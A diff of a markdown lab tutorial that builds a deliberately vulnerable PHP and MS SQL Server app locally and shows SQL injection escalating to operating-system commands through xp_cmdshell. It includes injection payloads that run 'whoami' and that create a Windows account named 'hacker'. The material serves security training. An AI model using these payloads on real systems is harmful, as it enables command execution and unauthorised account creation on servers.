@@ -121,14 +121,19 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
 7. Before running the vulnerable web application, download and install SQLSRV driver that matches the PHP version. If the PHP version is 8.2.12, find the files named `php_sqlsrv_82_nts_x64.dll` and `php_pdo_sqlsrv_82_nts_x64.dll` and copy them both to `C:\xampp\php\ext\`. Update the `php.ini` file to include `extension=php_sqlsrv_82_nts_x64.dll` and `extension=php_pdo_sqlsrv_82_nts_x64.dll` in the extensions section. Restart Apache in XAMPP
 8. In SMSS, open a new query window and run the following SQL commands
    ```
-   CREATE TABLE Users (
-    ID INT PRIMARY KEY IDENTITY(1,1),
-    Username NVARCHAR(50),
-    Password NVARCHAR(50)
+   CREATE TABLE users (
+    ID INT PRIMARY KEY,
+    Username VARCHAR(50),
+    Password VARCHAR(50),
+    Email VARCHAR(100)
    );
    
-   INSERT INTO Users (Username, Password) VALUES ('admin', 'password123');
-   INSERT INTO Users (Username, Password) VALUES ('user1', 'userpass');
+   INSERT INTO users (ID, Username, Password, Email)
+   VALUES
+   (1, 'admin', 'password123', 'admin@example.com'),
+   (2, 'user1', 'userpass', 'user1@example.com'),
+   (3, 'user2', 'user2pass', 'user2@example.com'),
+   (4, 'user3', 'user3pass', 'user3@example.com');
    ```
    The data can be found by expanding the Tables Node located under the master node
    ![image](https://github.com/user-attachments/assets/18dcc7d3-e34c-4ac2-a104-db3571d3170e)
@@ -158,13 +163,13 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
    ```
    SELECT * FROM sys.syslogins WHERE name = 'username';
    ```
-11. In the web app, add `?id=1` at the end of the URL to check and retrieve data with ID = 1 stored in the database table
+11. In the web app, add `1` into the user input field to check and retrieve data with ID = 1 stored in the database table
 12. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
     ```
-    http://localhost/vulnsql/vuln.php?id=1'; EXEC xp_cmdshell 'whoami';--
+    1'; EXEC xp_cmdshell 'whoami';--
     ```
     ![image](https://github.com/user-attachments/assets/9ec1f657-8509-40ee-b7a0-4b1e167e1871)
-13. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
+13. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings inside the user input field
     ```
     http://localhost/vulnsql/vuln.php?id=1'; EXEC xp_cmdshell 'net user hacker hacked1337 /add';--
     ```
